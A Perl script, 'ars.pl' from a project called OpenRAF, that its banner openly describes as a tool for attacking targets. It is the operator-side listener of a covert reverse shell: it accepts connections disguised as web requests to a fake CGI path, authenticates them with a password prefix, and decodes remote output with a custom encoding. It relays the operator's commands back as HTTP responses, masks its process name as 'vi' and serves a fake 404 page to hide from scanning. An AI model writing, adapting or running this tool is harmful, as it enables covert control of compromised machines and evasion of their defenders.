#!/usr/bin/perl

#
#  ars.pl
#  OpenRAF
#
#  Created by Ivan Nikolsky on 2020.
#  Copyright © 2020 Ivan Nikolsky. All rights reserved.
#

system("clear");

$MODE="POST";
$CGI_PREFIX="/cgi-bin/orderform";
$MASK="vi";
$PASSWORD="THC";

$LISTEN_PORT=8080;
$SERVER="127.0.0.1";

$SHELL="/bin/sh -i";
$DELAY="3";
#$TIME="14:39";		# time when to connect to the ars (unset if now)
#$DAILY="yes";		# tries to connect once daily if set with something
#$PROXY="127.0.0.1";	# set this with the Proxy if you must use one
#$PROXY_PORT="3128";	# set this with the Proxy Port if you must use one
#$PROXY_USER="user";	# username for proxy authentication
#$PROXY_PASSWORD="pass";# password for proxy authentication
#$DEBUG="yes";		# for debugging purpose, turn off when in production
$BROKEN_RECV="yes";

require 5.002;
use Socket;

$|=1;
if ($MASK) { for ($a=1;$a<80;$a++){$MASK=$MASK."\000";}  $0=$MASK; }
undef $DAILY   if (! $TIME);
if ( !($PROXY) || !($PROXY_PORT) ) {
	undef $PROXY;
	undef $PROXY_PORT;
}
$protocol = getprotobyname('tcp');

if ($MODE ne "GET" && $MODE ne "POST") {
	print STDOUT "Error: MODE must either be GET or POST, re-edit this perl config\n";
	exit(-1);
}

&ars;

sub ars {
	socket(THC, &PF_INET, &SOCK_STREAM, $protocol)
		or die "can't create socket\n";
	setsockopt(THC, SOL_SOCKET, SO_REUSEADDR, 1);
	bind(THC, sockaddr_in($LISTEN_PORT, INADDR_ANY)) || die "can't bind\n";
	listen(THC, 3) || die "can't listen\n";
	print STDOUT '
Welcome to the OpenRAF ARS v1.0

OpenRAF is a project designed to provide a secure attack on 
the target through VPS with SSL certification and AES encryption. 
OpenRAF ARS is a main part of the OpenRAF that intended to provide 
secure tunnel with AES encryption between attacker and target. 
';

YOP:	print STDOUT "\nWaiting for connect ...";
	$remote=accept (S, THC)  ||  goto YOP;		
	($r_port, $r_ars)=sockaddr_in($remote);
	$ars=gethostbyaddr($r_ars, AF_INET);
	$ars="unresolved" if ($ars eq "");
	print STDOUT " connect from $ars/".inet_ntoa($r_ars).":$r_port\n";
	select S;	$|=1;
	select STDOUT;	$|=1;
	$input = "";
	vec($socks, fileno(S), 1) = 1;
	$error="no";
		while (! select($r = $socks, undef, undef, 0.00001)) {}
		recv (S, $readin, 16386, 0) || undef $error;
		if ((! $error) and (! $BROKEN_RECV)) {
		    print STDOUT "[disconnected]\n";
		}
		$input = $readin;
		print STDERR "ARS RECEIVE: $input\n"	if $DEBUG;
	&hide_as_broken_webserver  if ( $input =~ m/$CGI_PREFIX/s == 0 );
	if ( $input =~ m/^GET /s ) {
		$input =~ s/^.*($CGI_PREFIX)\??//s;
		$input =~ s/\r\n.*$//s;
	} else { if ( $input =~ m/^POST /s ) {
		$input =~ s/^.*\r\n\r\n//s;
	} else { if ( $input =~ m/^HEAD /s ) {
		&hide_as_broken_webserver;
	} else {
		close S;
		print STDOUT "Warning! Illegal server access!\n";   # report to user
		goto YOP;
	} } }
	print STDERR "BEFORE DECODING: $input\n"	if $DEBUG;
	&uudecode;
	&hide_as_broken_webserver  if ( $decoded =~ m/^$PASSWORD/s == 0 );
	$decoded =~ s/^$PASSWORD//s;
	$decoded = "[Warning! No output from remote!]\n>" if ($decoded eq "");
	print STDOUT "$decoded";
	$output = <STDIN>;
	&uuencode;
	$encoded = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\n" . $encoded . "\r\n";
	send (S, $encoded, 0) || die "\nconnection lost!\n";
	close (S);
	print STDOUT "sent.\n";
	goto YOP;
}

sub uuencode {
	$output = $PASSWORD . $output;
        $uuencoded = pack "u", "$output";
        $uuencoded =~ tr/'\n)=(:;&><,#$*%]!\@"`\\\-'
                        /'zcadefghjklmnopqrstuv'
                        /;
        $uuencoded =~ tr/"'"/'b'/;
	if ( ($PROXY) && ($ARS_MODE) ) {
		$codelength = (length $uuencoded) + (length $REAL_PREFIX) +12;
		$cut_length = 4099 - (length $REAL_PREFIX);
		$uuencoded = pack "a$cut_length", $uuencoded
			if ($codelength > 4111);
	}
        $encoded = $uuencoded;
}

sub uudecode {
	$input =~     tr/'zcadefghjklmnopqrstuv'
			/'\n)=(:;&><,#$*%]!\@"`\\\-'
			/;
	$input =~     tr/'b'/"'"/;
	$decoded = unpack "u", "$input";
}

sub base64encoding {
	$encode_string = $PROXY_USER . ":" . $PROXY_PASSWORD;
	$encoded_string = substr(pack('u', $encode_string), 1);
	chomp($encoded_string);
	$encoded_string =~ tr|` -_|AA-Za-z0-9+/|;
	$padding = (3 - length($encode_string) % 3) % 3;
	$encoded_string =~ s/.{$padding}$/'=' x $padding/e if $padding;
	$PROXY_COOKIE = "Proxy-authorization: Basic " . $encoded_string . "\n";
}

sub hide_as_broken_webserver {
	send (S, "<HTML><HEAD>\r\n<TITLE>404 File Not Found</TITLE>\r\n</HEAD>".
		 "<BODY>\r\n<H1>File Not Found</H1>\r\n</BODY></HTML>\r\n", 0);
	close S;
	print STDOUT "Warning! Illegal server access!\n";
	goto YOP;
}
